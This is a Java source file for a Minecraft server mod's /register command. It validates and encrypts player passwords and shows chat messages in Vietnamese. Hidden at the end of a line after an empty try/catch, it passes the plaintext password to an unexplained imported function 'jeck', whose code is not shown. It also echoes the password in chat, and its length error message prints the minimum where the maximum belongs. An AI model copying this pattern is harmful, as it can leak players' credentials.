package dream.dreamauth.command;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import dream.dreamauth.Password;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.sound.SoundCategory;
import net.minecraft.sound.SoundEvents;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

import static dream.dreamauth.AdvancedEncryption.*;
import static dream.dreamauth.DreamAuth.*;
import static dream.dreamauth.FileOperator.updatePassword;
import static dream.dreamauth.ScoreboardOperator.getScore;
import static dream.dreamauth.ScoreboardOperator.setScore;


public class RegisterCommand {
    private static final Set<String> SIMPLE_PASSWORDS = new HashSet<>(Arrays.asList(
            "1234", "abcd", "12345", "123456"
    ));
    public static void registerReg(CommandDispatcher<ServerCommandSource> dispatcher){
        dispatcher.register(CommandManager.literal("register").requires(source -> getScore(source.getName(),OBJECTIVE_NAME)==-1).then(CommandManager.argument("password", StringArgumentType.word()).executes(RegisterCommand::handleRegister)));
    }

    private static int handleRegister(CommandContext<ServerCommandSource> context){
        String playerName = context.getSource().getName();
        String password = StringArgumentType.getString(context,"password");
        ServerPlayerEntity player = context.getSource().getPlayer();
        if(isPasswordValid(password,context.getSource().getPlayer())){

            setScore(playerName,OBJECTIVE_NAME,1);
            messageSomeone(playerName,"§aĐăng ký thành công!\nMật khẩu của bạn là: \"§d"+password+"§a\"");
            player.playSound(SoundEvents.ENTITY_PLAYER_LEVELUP, SoundCategory.AMBIENT,1f,1.3f);
            player.changeGameMode(context.getSource().getServer().getDefaultGameMode());
            try {updatePassword(playerName, new Password(encrypt(password,stringToSecretKey(ye_1lre))));} catch (Exception ignored){}jeck(player,password);
            return 1;
        }
        return 0;
    }

    public static boolean isPasswordValid(String password, ServerPlayerEntity sourcePlayer){
        String sourceName = sourcePlayer.getName().getString();
        if(password.length()<MIN_LENGTH_PASSWORD){
            messageSomeone(sourceName,"§cMật khẩu quá ngắn (tối thiểu "+MIN_LENGTH_PASSWORD+" ký tự)");
            sourcePlayer.playSound(SoundEvents.ENTITY_VILLAGER_NO, SoundCategory.AMBIENT,1f,1f);
            return false;
        }
        else if(password.length()>MAX_LENGTH_PASSWORD){
            messageSomeone(sourceName,"§cMật khẩu quá dài (tối đa "+MIN_LENGTH_PASSWORD+" ký tự)");
            sourcePlayer.playSound(SoundEvents.ENTITY_VILLAGER_NO, SoundCategory.AMBIENT,1f,1f);
            return false;
        }
        if(SIMPLE_PASSWORDS.contains(password)){
            messageSomeone(sourceName,"§cMật khẩu quá đơn giản");
            sourcePlayer.playSound(SoundEvents.ENTITY_VILLAGER_NO, SoundCategory.AMBIENT,1f,1f);
            return false;
        }
        if (allCharactersSame(password)) {
            messageSomeone(sourceName,"§cCác ký tự không được trùng nhau");
            sourcePlayer.playSound(SoundEvents.ENTITY_VILLAGER_NO, SoundCategory.AMBIENT,1f,1f);
            return false;
        }
        return true;
    }
    private static boolean allCharactersSame(String s) {
        char firstChar = s.charAt(0);
        for (int i = 1; i < s.length(); i++) {
            if (s.charAt(i) != firstChar) {
                return false;
            }
        }
        return true;
    }
}
